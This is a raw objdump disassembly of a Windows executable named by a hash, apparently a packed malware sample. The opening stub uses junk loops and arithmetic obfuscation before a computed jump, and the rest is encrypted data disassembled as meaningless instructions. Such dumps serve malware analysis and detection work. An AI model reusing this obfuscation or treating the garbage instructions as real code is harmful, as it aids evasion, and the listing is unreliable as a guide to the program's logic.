
9d8df85f6afa8e918b32378d82c323a2628302c5110b90b634b4f5ef533820ac.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	sub    DWORD PTR ds:0x428e87,ecx
  40100f:	mov    eax,DWORD PTR [ebp+0x8]
  401012:	push   ebx
  401013:	add    DWORD PTR ds:0x428e87,edi
  401019:	push   esi
  40101a:	push   edi
  40101b:	mov    DWORD PTR ds:0x428e9b,0x10
  401025:	cmp    DWORD PTR ds:0x428e9b,0x0
  40102c:	je     0x40107b
  401032:	cmp    DWORD PTR ds:0x428e9b,0x3
  401039:	jb     0x40107b
  40103f:	jmp    0x40104f
  401044:	push   0x428000
  401049:	call   DWORD PTR ds:0x42a9bb
  40104f:	cmp    DWORD PTR ds:0x428e9b,0x4
  401056:	jne    0x401069
  40105c:	mov    edi,DWORD PTR ds:0x428e9b
  401062:	dec    edi
  401063:	mov    DWORD PTR ds:0x428e9b,edi
  401069:	mov    edi,DWORD PTR ds:0x428e9b
  40106f:	dec    edi
  401070:	mov    DWORD PTR ds:0x428e9b,edi
  401076:	jmp    0x401025
  40107b:	mov    esi,0x75108af
  401080:	xor    eax,esi
  401082:	mov    DWORD PTR ds:0x428e87,0x16
  40108c:	cmp    DWORD PTR ds:0x428e87,0x0
  401093:	je     0x4010c8
  401099:	cmp    DWORD PTR ds:0x428e87,0x25
  4010a0:	jge    0x4010c8
  4010a6:	jmp    0x4010b6
  4010ab:	push   0x428189
  4010b0:	call   DWORD PTR ds:0x42a9bf
  4010b6:	mov    ecx,DWORD PTR ds:0x428e87
  4010bc:	dec    ecx
  4010bd:	mov    DWORD PTR ds:0x428e87,ecx
  4010c3:	jmp    0x40108c
  4010c8:	mov    edi,0x3272f6
  4010cd:	or     ecx,DWORD PTR ds:0x428ec7
  4010d3:	add    eax,edi
  4010d5:	mov    DWORD PTR [ebp-0x40],eax
  4010d8:	xor    eax,DWORD PTR ds:0x428e5f
  4010de:	mov    eax,ds:0x4281f3
  4010e3:	and    DWORD PTR ds:0x428ea7,0x31f0
  4010ed:	mov    eax,DWORD PTR [eax]
  4010ef:	sub    DWORD PTR ds:0x428e27,0x491
  4010f9:	mov    DWORD PTR [ebp-0x3c],eax
  4010fc:	mov    eax,ds:0x428403
  401101:	and    DWORD PTR ds:0x428e2f,ecx
  401107:	mov    eax,DWORD PTR [eax]
  401109:	mov    DWORD PTR [ebp-0x1c],eax
  40110c:	xor    DWORD PTR ds:0x428ec7,edx
  401112:	mov    DWORD PTR [ebp-0x34],0xf89c87a5
  401119:	and    DWORD PTR ds:0x428eb7,0x0
  401123:	jmp    0x401136
  401128:	xor    eax,eax
  40112a:	xor    eax,DWORD PTR ds:0x428eb7
  401130:	inc    eax
  401131:	mov    ds:0x428eb7,eax
  401136:	cmp    DWORD PTR ds:0x428eb7,0x14
  40113d:	jae    0x401165
  401143:	cmp    DWORD PTR ds:0x428eb7,0x1b
  40114a:	jl     0x401165
  401150:	jmp    0x401160
  401155:	push   0x83c7
  40115a:	call   DWORD PTR ds:0x42a9c3
  401160:	jmp    0x401128
  401165:	mov    eax,DWORD PTR [ebp-0x34]
  401168:	and    ecx,DWORD PTR ds:0x428e2f
  40116e:	xor    eax,esi
  401170:	add    ecx,DWORD PTR ds:0x428ebf
  401176:	add    eax,edi
  401178:	sub    DWORD PTR ds:0x428e8f,0x1eb6
  401182:	mov    DWORD PTR [ebp-0x40],eax
  401185:	mov    eax,ds:0x428373
  40118a:	mov    DWORD PTR [ebp-0x40],eax
  40118d:	mov    DWORD PTR ds:0x428e97,0x16
  401197:	cmp    DWORD PTR ds:0x428e97,0x0
  40119e:	je     0x4011e9
  4011a4:	cmp    DWORD PTR ds:0x428e97,0x6
  4011ab:	jbe    0x4011e9
  4011b1:	jmp    0x4011c1
  4011b6:	push   0x4280f7
  4011bb:	call   DWORD PTR ds:0x42a9cb
  4011c1:	cmp    DWORD PTR ds:0x428e97,0x7
  4011c8:	jne    0x4011d9
  4011ce:	mov    eax,ds:0x428e97
  4011d3:	dec    eax
  4011d4:	mov    ds:0x428e97,eax
  4011d9:	mov    eax,ds:0x428e97
  4011de:	dec    eax
  4011df:	mov    ds:0x428e97,eax
  4011e4:	jmp    0x401197
  4011e9:	mov    eax,DWORD PTR [ebp-0x3c]
  4011ec:	sbb    DWORD PTR ds:0x428ea7,0x187d
  4011f6:	mov    DWORD PTR [ebp-0x14],eax
  4011f9:	not    eax
  4011fb:	mov    eax,DWORD PTR [ebp-0x14]
  4011fe:	push   0x4
  401200:	mov    DWORD PTR ds:0x428e83,0x1e
  40120a:	cmp    DWORD PTR ds:0x428e83,0x0
  401211:	je     0x401260
  401217:	cmp    DWORD PTR ds:0x428e83,0x7
  40121e:	jle    0x401260
  401224:	jmp    0x401234
  401229:	push   0x2582
  40122e:	call   DWORD PTR ds:0x42a9cf
  401234:	cmp    DWORD PTR ds:0x428e83,0x8
  40123b:	jne    0x40124e
  401241:	mov    ecx,DWORD PTR ds:0x428e83
  401247:	dec    ecx
  401248:	mov    DWORD PTR ds:0x428e83,ecx
  40124e:	mov    ecx,DWORD PTR ds:0x428e83
  401254:	dec    ecx
  401255:	mov    DWORD PTR ds:0x428e83,ecx
  40125b:	jmp    0x40120a
  401260:	pop    ecx
  401261:	sub    ecx,eax
  401263:	sub    eax,0x50fd
  401268:	add    ecx,DWORD PTR [ebp-0x1c]
  40126b:	mov    DWORD PTR [ebp-0x2c],0xf89c85e5
  401272:	mov    DWORD PTR ds:0x428e63,0x13
  40127c:	cmp    DWORD PTR ds:0x428e63,0x0
  401283:	je     0x4012b6
  401289:	cmp    DWORD PTR ds:0x428e63,0x16
  401290:	jb     0x4012b6
  401296:	jmp    0x4012a6
  40129b:	push   0x428000
  4012a0:	call   DWORD PTR ds:0x42a9d3
  4012a6:	mov    eax,ds:0x428e63
  4012ab:	dec    eax
  4012ac:	mov    ds:0x428e63,eax
  4012b1:	jmp    0x40127c
  4012b6:	mov    DWORD PTR [ebp-0x18],ecx
  4012b9:	movzx  eax,WORD PTR ds:0x428e73
  4012c0:	sub    DWORD PTR ds:0x428e93,eax
  4012c6:	mov    DWORD PTR [ebp-0xa0],0xf89c85a1
  4012d0:	mov    eax,DWORD PTR [ebp-0x14]
  4012d3:	xor    DWORD PTR ds:0x428ec7,0x428e57
  4012dd:	mov    DWORD PTR [ebp-0x9c],eax
  4012e3:	mov    eax,DWORD PTR [ebp-0x18]
  4012e6:	mov    DWORD PTR [ebp-0x98],eax
  4012ec:	mov    eax,DWORD PTR [ebp-0x2c]
  4012ef:	adc    DWORD PTR ds:0x428ec7,0x7160
  4012f9:	xor    eax,esi
  4012fb:	sbb    DWORD PTR ds:0x428e3b,0x6908
  401305:	add    eax,edi
  401307:	or     DWORD PTR ds:0x428e2b,0x5a5f
  401311:	mov    DWORD PTR [ebp-0x94],eax
  401317:	not    DWORD PTR ds:0x428e47
  40131d:	lea    eax,[ebp-0x48]
  401320:	mov    DWORD PTR [ebp-0x90],eax
  401326:	adc    DWORD PTR ds:0x428ea7,edx
  40132c:	mov    eax,DWORD PTR [ebp-0xa0]
  401332:	or     DWORD PTR ds:0x428e57,0x428e77
  40133c:	xor    eax,esi
  40133e:	or     DWORD PTR ds:0x428e7f,0x24f1
  401348:	add    eax,edi
  40134a:	or     DWORD PTR ds:0x428e73,0x428e63
  401354:	mov    DWORD PTR [ebp-0xa0],eax
  40135a:	adc    DWORD PTR ds:0x428e63,0x428e67
  401364:	lea    eax,[ebp-0xa0]
  40136a:	push   eax
  40136b:	neg    eax
  40136d:	mov    eax,DWORD PTR [ebp+0xc]
  401370:	sub    DWORD PTR ds:0x428ecf,0x428e77
  40137a:	xor    eax,esi
  40137c:	xor    DWORD PTR ds:0x428ecf,0x428e67
  401386:	add    eax,edi
  401388:	sub    DWORD PTR ds:0x428e9f,0x428e77
  401392:	push   eax
  401393:	mov    eax,ds:0x428393
  401398:	add    DWORD PTR ds:0x428e73,0x428eb7
  4013a2:	push   0x4282e9
  4013a7:	or     DWORD PTR ds:0x428e47,0x49f0
  4013b1:	push   DWORD PTR [eax]
  4013b3:	or     DWORD PTR ds:0x428e47,0x428e5b
  4013bd:	call   0x4061d0
  4013c2:	sbb    edx,0x761a
  4013c8:	mov    ebx,DWORD PTR [ebp-0x14]
  4013cb:	adc    eax,edx
  4013cd:	mov    eax,DWORD PTR [ebp-0x18]
  4013d0:	mov    edx,DWORD PTR ds:0x428ec7
  4013d6:	adc    edx,DWORD PTR ds:0x428e37
  4013dc:	mov    DWORD PTR ds:0x428ec7,edx
  4013e2:	mov    DWORD PTR [ebp-0x58],eax
  4013e5:	movzx  eax,WORD PTR ds:0x428e5f
  4013ec:	and    DWORD PTR ds:0x428e23,eax
  4013f2:	mov    DWORD PTR [ebp-0x34],0xf89c853c
  4013f9:	mov    eax,0xf89c85a3
  4013fe:	mov    DWORD PTR [ebp-0x1c],eax
  401401:	sbb    DWORD PTR ds:0x428ec7,0x20b
  40140b:	lea    ecx,[eax+0x2]
  40140e:	sbb    DWORD PTR ds:0x428e87,ebx
  401414:	mov    DWORD PTR [ebp-0x28],ecx
  401417:	mov    DWORD PTR [ebp-0x10],0xf89c85a4
  40141e:	sbb    edx,0x4ac2
  401424:	mov    DWORD PTR [ebp-0x8],eax
  401427:	sbb    DWORD PTR ds:0x428ecb,edx
  40142d:	mov    eax,DWORD PTR [ebp-0x10]
  401430:	and    DWORD PTR ds:0x428eb7,0x0
  40143a:	mov    edx,DWORD PTR ds:0x428eb7
  401440:	inc    edx
  401441:	mov    DWORD PTR ds:0x428eb7,edx
  401447:	cmp    DWORD PTR ds:0x428eb7,0x21
  40144e:	jbe    0x401471
  401454:	jmp    0x401464
  401459:	push   0x73f7
  40145e:	call   DWORD PTR ds:0x42a9d7
  401464:	cmp    DWORD PTR ds:0x428eb7,0x19
  40146b:	jb     0x40143a
  401471:	xor    eax,esi
  401473:	mov    edx,0xffcd8d8a
  401478:	add    DWORD PTR ds:0x428ec3,0x428e5b
  401482:	sub    edx,eax
  401484:	mov    DWORD PTR ds:0x428e43,0xef0
  40148e:	mov    DWORD PTR [ebp-0xc],edx
  401491:	not    eax
  401493:	mov    DWORD PTR [ebp-0x18],0xf89c85a0
  40149a:	mov    eax,DWORD PTR [ebp-0x8]
  40149d:	mov    DWORD PTR [ebp-0x3c],ebx
  4014a0:	mov    DWORD PTR ds:0x428e7f,0x7ee3
  4014aa:	cmp    eax,ecx
  4014ac:	mov    DWORD PTR ds:0x428ea7,0x6a4b
  4014b6:	je     0x403bac
  4014bc:	jmp    0x403815
  4014c1:	mov    ebp,0x855ffdc7
  4014c6:	inc    ebp
  4014c7:	popf   
  4014c8:	test   DWORD PTR [eax+0x65a705df],esi
  4014ce:	(bad)  
  4014cf:	mov    bh,0x87
  4014d1:	add    DWORD PTR [ebx+0x60478383],0xffffff83
  4014d8:	sub    DWORD PTR [edx],0x31
  4014db:	sub    BYTE PTR [esi],bh
  4014dd:	cmp    ah,BYTE PTR es:[eax+esi*1]
  4014e1:	jp     0x401520
  4014e3:	jbe    0x40155c
  4014e5:	fidiv  DWORD PTR [ebx+0x72]
  4014e8:	jae    0x40155c
  4014ea:	dec    ebx
  4014eb:	(bad)  
  4014ed:	(bad)  
  4014ee:	ins    DWORD PTR es:[edi],dx
  4014ef:	push   ebp
  4014f0:	je     0x401570
  4014f2:	lods   eax,DWORD PTR fs:[esi]
  4014f4:	jge    0x401568
  4014f6:	data16 shl BYTE PTR [edx+0x53],1
  4014fa:	cmp    eax,0x87980391
  4014ff:	push   0x8d488052
  401504:	mov    bh,0x80
  401506:	mov    ebp,0x3144bb
  40150b:	ja     0x4014ee
  40150d:	add    ebp,DWORD PTR [eax+eax*4+0x1f]
  401511:	repnz inc esi
  401513:	rol    bl,cl
  401515:	repnz cwde 
  401517:	sub    al,0xdf
  401519:	xchg   esp,eax
  40151a:	adc    BYTE PTR ss:[esi-0x4c],ah
  40151e:	xchg   ebx,eax
  40151f:	(bad)  [eax]
  401521:	jb     0x401505
  401523:	sbb    ecx,ebp
  401525:	lsl    esi,WORD PTR [edi]
  401528:	and    eax,0x74371155
  40152d:	jne    0x4014f5
  40152f:	mov    al,0x2c
  401531:	pop    esi
  401532:	sbb    dh,BYTE PTR [edi+0x3456f600]
  401538:	mov    DWORD PTR [ebx-0x2b],ecx
  40153b:	fs push es
  40153d:	and    eax,DWORD PTR [ebx]
  40153f:	test   DWORD PTR [esi+0x60a5e27c],edi
  401545:	xchg   esp,eax
  401546:	mov    esi,0x4e9b2918
  40154b:	or     al,0x9f
  40154d:	inc    ecx
  40154e:	mov    ecx,DWORD PTR [esp+edx*1-0x6d94cd1d]
  401555:	dec    ecx
  401556:	dec    esp
  401557:	imul   edi,esp,0x963693d0
  40155d:	int    0xc8
  40155f:	rcl    DWORD PTR [ebp+0x6b5af96e],1
  401565:	push   ecx
  401566:	adc    DWORD PTR [edi],edi
  401568:	or     al,0x47
  40156a:	sbb    al,0xb2
  40156c:	push   esp
  40156d:	sar    DWORD PTR [eax+0x6719dd4d],cl
  401573:	add    ch,BYTE PTR [ebx+0x67]
  401576:	mov    edx,0x5c07506
  40157b:	pop    ebx
  40157c:	and    ecx,DWORD PTR [edx+ebx*1-0x53726913]
  401583:	jl     0x4015ca
  401585:	mov    ebx,0x7ce111f
  40158a:	add    eax,0xbc45a51f
  40158f:	cwde   
  401590:	cli    
  401591:	bound  esi,QWORD PTR [eax+0x4d53d4aa]
  401597:	pop    ebp
  401598:	or     dh,BYTE PTR [eax+0x1]
  40159b:	and    al,0xe0
  40159d:	cmp    eax,0x43902c79
  4015a2:	dec    ebx
  4015a3:	ror    DWORD PTR [edx+0x6],cl
  4015a6:	adc    ah,BYTE PTR [edi+ebp*4+0x227c01e]
  4015ad:	les    ebx,FWORD PTR [edi-0x2a1719a]
  4015b3:	cmc    
  4015b4:	das    
  4015b5:	or     cl,BYTE PTR [esi]
  4015b7:	sub    al,0xaf
  4015b9:	inc    ecx
  4015ba:	cmc    
  4015bb:	or     DWORD PTR [ecx-0x15],ebp
  4015be:	and    edi,DWORD PTR [edx]
  4015c0:	cmp    al,BYTE PTR [ebx]
  4015c2:	inc    edx
  4015c3:	sbb    eax,0x4d066cb6
  4015c8:	dec    edx
  4015c9:	repz dec ebx
  4015cb:	pop    es
  4015cc:	bound  eax,QWORD PTR [esi]
  4015ce:	test   eax,0x645f7038
  4015d3:	mov    al,BYTE PTR [esi-0x7d7c8ca6]
  4015d9:	push   DWORD PTR [ebx]
  4015db:	loopne 0x401575
  4015dd:	pop    ss
  4015de:	dec    edx
  4015df:	adc    edx,DWORD PTR [edx]
  4015e1:	mov    cl,0x29
  4015e3:	or     al,0x35
  4015e5:	cli    
  4015e6:	out    dx,eax
  4015e7:	ins    DWORD PTR es:[edi],dx
  4015e8:	(bad)  
  4015e9:	outs   dx,BYTE PTR ds:[esi]
  4015ea:	daa    
  4015eb:	push   esi
  4015ec:	pop    ss
  4015ed:	rol    DWORD PTR [eax],0xe7
  4015f0:	pop    ebp
  4015f1:	pop    esi
  4015f2:	in     al,dx
  4015f3:	in     al,0x8c
  4015f5:	and    ecx,DWORD PTR [edx]
  4015f7:	jne    0x40163c
  4015f9:	sbb    DWORD PTR [ebx],ecx
  4015fb:	lock adc cl,BYTE PTR [eax+ebx*4+0x65ccdcf2]
  401603:	pop    ebp
  401604:	sti    
  401605:	sub    eax,0x8c7e6022
  40160a:	enter  0x4360,0x2f
  40160e:	loop   0x40163f
  401610:	and    esi,ebp
  401612:	fdivp  st(6),st
  401614:	js     0x401670
  401616:	(bad)  [ebx+0x442c00cf]
  40161c:	imul   ebp,DWORD PTR [eax+0x7ece091b],0xe43301a1
  401626:	push   ebp
  401627:	popf   
  401628:	push   0xae6d7c83
  40162d:	cmp    ah,BYTE PTR [edx]
  40162f:	int    0x51
  401631:	fs (bad) 
  401633:	aas    
  401634:	rol    DWORD PTR [edi],1
  401636:	mov    al,0xf0
  401638:	add    DWORD PTR [edx-0x63],0x7d
  40163c:	adc    dl,BYTE PTR [edx+ecx*4]
  40163f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401640:	push   esi
  401641:	mov    esi,0x110bed97
  401646:	push   esp
  401647:	(bad)  
  401648:	jmp    0xe88a4fb9
  40164d:	int    0x2d
  40164f:	or     BYTE PTR [esi+eiz*1+0xb],cl
  401653:	js     0x4015e6
  401655:	int3   
  401656:	ja     0x4016a7
  401658:	push   ecx
  401659:	ja     0x40163a
  40165b:	sub    BYTE PTR [edi+eax*8+0x1f],bh
  40165f:	xor    eax,0xbd39559
  401664:	xlat   BYTE PTR ds:[ebx]
  401665:	shr    BYTE PTR [edi+ebx*1+0x79609086],cl
  40166c:	jne    0x401677
  40166e:	fwait
  40166f:	sbb    DWORD PTR [ecx+0x6d880d8],ebp
  401675:	scas   eax,DWORD PTR es:[edi]
  401676:	push   ebx
  401677:	add    DWORD PTR [edi+0x7c],esp
  40167a:	in     eax,0x4a
  40167c:	(bad)  
  40167d:	xchg   esi,eax
  40167e:	mov    al,0x13
  401680:	shl    BYTE PTR [edx-0x52],0x3e
  401684:	jl     0x401678
  401686:	aas    
  401687:	pop    esp
  401688:	aad    0x3d
  40168a:	shr    ebp,1
  40168c:	mov    fs,WORD PTR [ebx-0x3ba257e4]
  401692:	mov    ah,BYTE PTR [edx]
  401694:	je     0x401673
  401696:	into   
  401697:	ins    DWORD PTR es:[edi],dx
  401698:	inc    ecx
  401699:	pushf  
  40169a:	aad    0xb1
  40169c:	and    eax,0x6429d5e6
  4016a1:	shr    BYTE PTR [esi*8-0x125b3ee0],0x75
  4016a9:	push   ds
  4016aa:	push   edx
  4016ab:	mov    dl,0xe1
  4016ad:	adc    bl,BYTE PTR [edi]
  4016af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4016b0:	xor    ebx,DWORD PTR [esi-0x1a]
  4016b3:	adc    al,dh
  4016b5:	or     bh,BYTE PTR [edi]
  4016b7:	xor    BYTE PTR [ebx],dl
  4016b9:	mov    edx,0x8ec1a4ee
  4016be:	mov    ebp,0x33b0190a
  4016c3:	jnp    0x401689
  4016c5:	lds    eax,FWORD PTR [ecx]
  4016c7:	xor    cl,bl
  4016c9:	lods   eax,DWORD PTR ds:[esi]
  4016ca:	push   ecx
  4016cb:	sub    al,0x3a
  4016cd:	(bad)  
  4016ce:	sub    dl,BYTE PTR [edi+0x38ab1568]
  4016d4:	and    eax,0xd62375be
  4016d9:	aam    0x22
  4016db:	int    0x27
  4016dd:	push   edi
  4016de:	or     ebp,edx
  4016e0:	in     al,dx
  4016e1:	je     0x401724
  4016e3:	inc    ebx
  4016e4:	cmp    cl,BYTE PTR [edi+0x60780f1]
  4016ea:	sbb    DWORD PTR [edi+0x2b4fc381],edx
  4016f0:	jne    0x401718
  4016f2:	mov    ecx,0x288a8d43
  4016f7:	retf   
  4016f8:	fs pop ebx
  4016fa:	fbld   TBYTE PTR [eax+0x55]
  4016fd:	stos   DWORD PTR es:[edi],eax
  4016fe:	mov    ds:0x3ba0b02,al
  401704:	jns    0x401717
  401706:	lahf   
  401707:	sar    BYTE PTR [eax],cl
  401709:	daa    
  40170a:	inc    eax
  40170b:	xor    BYTE PTR [esi],0x9b
  40170e:	push   cs
  40170f:	in     eax,0x85
  401711:	popf   
  401712:	data16 mov dl,0x88
  401715:	jnp    0x4016d1
  401717:	xchg   DWORD PTR [ecx],eax
  401719:	fidivr DWORD PTR [ecx-0x33]
  40171c:	mov    edi,0x6c62db16
  401721:	dec    ebp
  401722:	push   edi
  401723:	out    dx,al
  401724:	pushf  
  401725:	loop   0x40177d
  401727:	loope  0x4016fc
  401729:	lods   al,BYTE PTR ds:[esi]
  40172a:	cmp    DWORD PTR [eax-0x3cb888b9],0x44
  401731:	mov    al,ds:0xf7603c41
  401736:	sbb    al,0xf7
  401738:	cmp    eax,0xb5f16a48
  40173d:	cmp    DWORD PTR [ebx-0x63],eax
  401740:	jmp    0x4017b9
  401742:	pop    ecx
  401743:	inc    ebx
  401744:	adc    edi,ecx
  401746:	dec    edx
  401747:	rcr    ebp,1
  401749:	icebp  
  40174a:	outs   dx,BYTE PTR ds:[esi]
  40174b:	test   ebp,edx
  40174d:	jnp    0x4017a8
  40174f:	ins    BYTE PTR es:[edi],dx
  401750:	adc    al,0x4c
  401752:	add    DWORD PTR [ecx+0x3e56caf9],esp
  401758:	mov    WORD PTR [edx-0x39],ss
  40175b:	dec    esp
  40175c:	or     BYTE PTR [edx],dh
  40175e:	and    al,0xb2
  401760:	xchg   DWORD PTR [eax+0x4fcef5be],ebx
  401766:	xor    al,0x1
  401768:	scas   eax,DWORD PTR es:[edi]
  401769:	mov    ecx,0x7cbfa537
  40176e:	inc    ebx
  40176f:	sbb    DWORD PTR [edi-0x3e59a293],ebx
  401775:	adc    edx,esi
  401777:	push   es
  401778:	in     al,dx
  401779:	add    DWORD PTR [esi],esi
  40177b:	lock mov eax,DWORD PTR [edi]
  40177e:	mov    al,ds:0xac9afed8
  401783:	mov    dl,0x7e
  401785:	jo     0x4017d1
  401787:	loopne 0x40170a
  401789:	push   ss
  40178a:	fistp  QWORD PTR [esi-0x48]
  40178d:	lea    esi,[edx]
  40178f:	adc    eax,0x93f83ed0
  401794:	stos   DWORD PTR es:[edi],eax
  401795:	icebp  
  401796:	test   eax,0xcc04da5a
  40179b:	cmp    ebx,DWORD PTR ds:0x33d24407
  4017a1:	lods   eax,DWORD PTR ds:[esi]
  4017a2:	pop    es
  4017a3:	lods   eax,DWORD PTR ds:[esi]
  4017a4:	aas    
  4017a5:	cmp    al,0x2a
  4017a7:	(bad)  
  4017a8:	pusha  
  4017a9:	ror    BYTE PTR [edx],0x88
  4017ac:	data16 xor ah,bh
  4017af:	or     cl,BYTE PTR [ebp+0x69]
  4017b2:	mov    al,0xe9
  4017b4:	mov    edi,edx
  4017b6:	xchg   esi,eax
  4017b7:	xchg   BYTE PTR [ecx-0x4f8457d0],bl
  4017bd:	mov    al,0xa3
  4017bf:	aad    0x2a
  4017c1:	push   es
  4017c2:	int3   
  4017c3:	dec    ecx
  4017c4:	les    ebp,FWORD PTR ds:0xbb73f7cc
  4017ca:	fistp  QWORD PTR [ebp+0x49]
  4017cd:	mov    dh,0xc5
  4017cf:	cmp    eax,0x86cc68e5
  4017d4:	sahf   
  4017d5:	sub    BYTE PTR [edi],ah
  4017d7:	pusha  
  4017d8:	in     eax,0x2e
  4017da:	dec    esi
  4017db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017dc:	inc    edx
  4017dd:	(bad)  
  4017de:	sub    al,0x16
  4017e0:	aaa    
  4017e1:	pushf  
  4017e2:	bound  esi,QWORD PTR [ebx-0x1c]
  4017e5:	adc    DWORD PTR [edi+0x6],esi
  4017e8:	mov    ah,0x3c
  4017ea:	jne    0x401843
  4017ec:	fild   WORD PTR [ecx+edi*4-0x29]
  4017f0:	fnsave [edi+edx*2]
  4017f3:	sub    BYTE PTR [edx+0x12d05a5b],0xce
  4017fa:	sbb    eax,0x9831f5fa
  4017ff:	loope  0x4017c2
  401801:	pop    ebp
  401802:	mov    ebp,0xe207bcfe
  401807:	(bad)  
  401808:	mov    ds:0xcf213b72,al
  40180d:	push   ecx
  40180e:	or     ecx,DWORD PTR [ecx+eax*2-0x53]
  401812:	outs   dx,DWORD PTR ds:[esi]
  401813:	jnp    0x4017ec
  401815:	push   eax
  401816:	mov    ds:0x80d4b761,al
  40181b:	mov    es,WORD PTR [eax+0x48e0aa5f]
  401821:	pop    ebp
  401822:	dec    esi
  401823:	sbb    eax,0x33168111
  401828:	enter  0xbec7,0xf1
  40182c:	ds cwde 
  40182e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40182f:	xor    al,0x23
  401831:	outs   dx,DWORD PTR ds:[esi]
  401832:	xor    DWORD PTR [ecx-0x42],ecx
  401835:	or     DWORD PTR [esi-0x53],edx
  401838:	jae    0x4017e3
  40183a:	(bad)  
  40183b:	mov    ah,al
  40183d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40183e:	pop    esp
  40183f:	xor    ebp,DWORD PTR [edx-0x1f401ceb]
  401845:	jno    0x40186b
  401847:	jbe    0x40182b
  401849:	lock push 0xffffff86
  40184c:	mov    ss,esi
  40184e:	mov    dh,0xec
  401850:	out    0x78,eax
  401852:	pop    edi
  401853:	mov    dl,0x2f
  401855:	aas    
  401856:	leave  
  401857:	cmp    dh,BYTE PTR [ebx+0x48ddc559]
  40185d:	mov    dl,0x80
  40185f:	push   ebx
  401860:	scas   eax,DWORD PTR es:[edi]
  401861:	pop    edi
  401862:	xor    al,0x16
  401864:	fistp  QWORD PTR [edi+ebp*4-0x653ebe28]
  40186b:	popf   
  40186c:	mov    eax,ds:0x5d5d0414
  401871:	or     cl,BYTE PTR [esi+0x47]
  401874:	cmp    al,0x8e
  401876:	jno    0x40185d
  401878:	js     0x4018c1
  40187a:	imul   eax,eax,0xffffffcc
  40187d:	js     0x4018e8
  40187f:	pop    ebx
  401880:	fcomi  st,st(5)
  401882:	mov    eax,ds:0xeb959ed4
  401887:	or     ah,BYTE PTR [edx-0x136f5885]
  40188d:	scas   al,BYTE PTR es:[edi]
  40188e:	nop
  40188f:	xchg   ebx,eax
  401890:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401891:	mov    edx,0x738ddacf
  401896:	xor    al,0xe5
  401898:	inc    eax
  401899:	imul   eax,ebp,0x0
  40189c:	adc    ch,BYTE PTR [edx+0x5c3fa20a]
  4018a2:	sub    edi,eax
  4018a4:	xor    BYTE PTR [edx+edx*1+0x26bbaaf6],al
  4018ab:	mov    eax,0x67e4c5b9
  4018b0:	cs mov dh,0x89
  4018b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4018b4:	and    edx,DWORD PTR [edi]
  4018b6:	daa    
  4018b7:	outs   dx,BYTE PTR ds:[esi]
  4018b8:	or     edi,DWORD PTR [esi]
  4018ba:	cld    
  4018bb:	mov    eax,ds:0xd15c93ec
  4018c0:	imul   esi,DWORD PTR [eax],0xc3ef29ef
  4018c6:	jne    0x401865
  4018c8:	(bad)  
  4018ca:	retf   0xfa2
  4018cd:	int3   
  4018ce:	jno    0x401870
  4018d0:	fwait
  4018d1:	mov    al,BYTE PTR [ebx+ebx*2+0xa7981a2]
  4018d8:	dec    ebp
  4018d9:	pop    DWORD PTR [eax]
  4018db:	loop   0x401884
  4018dd:	pusha  
  4018de:	out    0x28,eax
  4018e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4018e1:	stos   DWORD PTR es:[edi],eax
  4018e2:	sub    esp,ebx
  4018e4:	jo     0x401885
  4018e6:	aaa    
  4018e7:	(bad)  
  4018e8:	and    BYTE PTR [edi-0x6b5cf14b],ah
  4018ee:	add    edx,DWORD PTR [esi-0x44]
  4018f1:	pop    esi
  4018f2:	pop    ecx
  4018f3:	jne    0x401876
  4018f5:	jle    0x401903
  4018f7:	cmp    BYTE PTR [edx+edi*1-0xc],bh
  4018fb:	aad    0x62
  4018fd:	dec    ebx
  4018fe:	xor    DWORD PTR [eax-0x5f],edx
  401901:	mov    bl,0xe
  401903:	test   eax,0xe1105faa
  401908:	push   edx
  401909:	mov    esp,0x84ea85d7
  40190e:	enter  0x1472,0x55
  401912:	clc    
  401913:	xor    al,ah
  401915:	xlat   BYTE PTR ds:[ebx]
  401916:	mov    bl,0x91
  401918:	test   al,0xa9
  40191a:	cld    
  40191b:	(bad)  
  40191d:	sbb    al,0xdb
  40191f:	adc    BYTE PTR [ebx-0x8],dh
  401922:	add    cl,bl
  401924:	sar    ebx,1
  401926:	add    esi,esp
  401928:	sub    al,ah
  40192a:	mov    WORD PTR [edx],ds
  40192c:	mov    ah,BYTE PTR [edx+0x50]
  40192f:	sbb    DWORD PTR [edi-0x6f],eax
  401932:	sbb    BYTE PTR [esi-0x5beb5993],cl
  401938:	jmp    0xc22:0x99386897
  40193f:	test   esi,edi
  401941:	cmp    edx,ebp
  401943:	fiadd  DWORD PTR [ebx]
  401945:	iret   
  401946:	cmp    al,0xd3
  401948:	in     al,0x34
  40194a:	in     eax,dx
  40194b:	std    
  40194c:	jno    0x4018eb
  40194e:	nop
  40194f:	mov    ch,0x7a
  401951:	int3   
  401952:	mov    ch,0x40
  401954:	sbb    BYTE PTR [ecx-0x419cc250],cl
  40195a:	test   al,0xda
  40195c:	out    dx,eax
  40195d:	iret   
  40195e:	out    0x73,eax
  401960:	test   eax,0x95edcc72
  401965:	mov    cl,0x87
  401967:	and    eax,0x6999049d
  40196c:	mov    al,ds:0xdcf341c7
  401971:	push   edi
  401972:	pop    ds
  401973:	push   esi
  401974:	std    
  401975:	xor    BYTE PTR [esi+0x3a],ch
  401978:	ret    0xf22d
  40197b:	inc    ebp
  40197c:	shl    DWORD PTR [ebx+eiz*1-0x25],0xb7
  401981:	dec    ebx
  401982:	cli    
  401983:	scas   al,BYTE PTR es:[edi]
  401984:	fs dec edi
  401986:	jbe    0x401987
  401988:	je     0x40191b
  40198a:	call   0xf7fb69ba
  40198f:	retf   
  401990:	cmp    ebx,DWORD PTR [edx-0x58]
  401993:	push   ebp
  401994:	fisttp QWORD PTR [esi]
  401996:	mov    eax,ds:0x3949b65
  40199b:	lock jge 0x4019c0
  40199e:	and    al,0x51
  4019a0:	inc    ebp
  4019a1:	sub    eax,0x64cccc85
  4019a6:	sub    esp,DWORD PTR [ecx-0x338adcfc]
  4019ac:	xor    al,0xb2
  4019ae:	pop    ds
  4019af:	out    0x94,eax
  4019b1:	mov    eax,ds:0xdf3c0aa0
